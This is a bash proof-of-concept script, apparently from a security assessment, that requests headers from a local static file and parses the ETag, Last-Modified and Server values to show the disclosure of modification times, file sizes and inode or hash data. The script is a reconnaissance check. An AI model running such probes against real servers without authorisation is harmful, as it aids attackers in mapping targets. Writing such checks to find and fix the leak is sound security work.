#!/bin/bash
# POC: Information Disclosure via ETag Metadata in Static File Handler
# This demonstrates how ETags expose file modification timestamps, sizes, and inode/hash information

TARGET_URL="http://localhost:5001/static/css/style.css"

echo "=========================================="
echo "POC: ETag Metadata Information Disclosure"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Make HEAD request to get headers including ETag
echo "[*] Requesting headers from static file endpoint..."
RESPONSE=$(curl -s -I "$TARGET_URL" 2>&1)

if [ $? -ne 0 ]; then
    echo "[!] Error: Unable to connect to $TARGET_URL"
    echo "[!] Make sure the application is running on port 5001"
    exit 1
fi

echo "$RESPONSE"
echo ""

# Extract and analyze ETag
ETAG=$(echo "$RESPONSE" | grep -i "ETag:" | cut -d'"' -f2)
LAST_MODIFIED=$(echo "$RESPONSE" | grep -i "Last-Modified:" | cut -d' ' -f2-)
SERVER=$(echo "$RESPONSE" | grep -i "^Server:" | cut -d' ' -f2-)

echo "=========================================="
echo "VULNERABILITY ANALYSIS"
echo "=========================================="
echo ""

if [ -n "$ETAG" ]; then
    echo "[+] ETag Found: $ETAG"
    echo ""
    
    # Parse ETag format (timestamp-filesize-hash)
    IFS='-' read -ra ETAG_PARTS <<< "$ETAG"
    
    if [ ${#ETAG_PARTS[@]} -eq 3 ]; then
        TIMESTAMP="${ETAG_PARTS[0]}"
        FILESIZE="${ETAG_PARTS[1]}"
        HASH_INODE="${ETAG_PARTS[2]}"
        
        echo "[!] INFORMATION DISCLOSED IN ETAG:"
        echo "    ├─ Timestamp: $TIMESTAMP"
        
        # Try to convert Unix timestamp to human-readable date if it looks like a timestamp
        if command -v date &> /dev/null && [[ "$TIMESTAMP" =~ ^[0-9]+\.?[0-9]*$ ]]; then
            TIMESTAMP_INT="${TIMESTAMP%.*}"
            HUMAN_DATE=$(date -d "@$TIMESTAMP_INT" 2>/dev/null || date -r "$TIMESTAMP_INT" 2>/dev/null || echo "Unable to convert")
            echo "    │  └─ Human Readable: $HUMAN_DATE"
        fi
        
        echo "    ├─ File Size: $FILESIZE bytes"
        echo "    └─ Hash/Inode: $HASH_INODE"
        echo ""
        echo "[!] SECURITY IMPLICATIONS:"
        echo "    • File modification time reveals deployment/update schedule"
        echo "    • Exact file size can identify specific library/framework versions"
        echo "    • Inode/hash information aids in filesystem reconnaissance"
    else
        echo "[*] ETag format is non-standard: $ETAG"
    fi
else
    echo "[-] No ETag header found"
fi

if [ -n "$LAST_MODIFIED" ]; then
    echo ""
    echo "[+] Last-Modified Header Found: $LAST_MODIFIED"
    echo "    └─ Exposes exact file modification timestamp"
fi

if [ -n "$SERVER" ]; then
    echo ""
    echo "[+] Server Header Found: $SERVER"
    echo "    └─ Exposes server software and version information"
fi

echo ""
echo "=========================================="
echo "CONCLUSION"
echo "=========================================="
echo ""

if [ -n "$ETAG" ] && [[ "$ETAG" == *"-"*"-"* ]]; then
    echo "[!] VULNERABLE: ETag exposes detailed file metadata"
    echo "[!] Attackers can use this information for reconnaissance:"
    echo "    • Map deployment timelines"
    echo "    • Identify specific file versions"
    echo "    • Gather filesystem metadata"
    echo ""
    echo "[+] POC completed successfully - vulnerability confirmed"
    exit 0
else
    echo "[-] Unable to confirm ETag metadata disclosure"
    exit 1
fi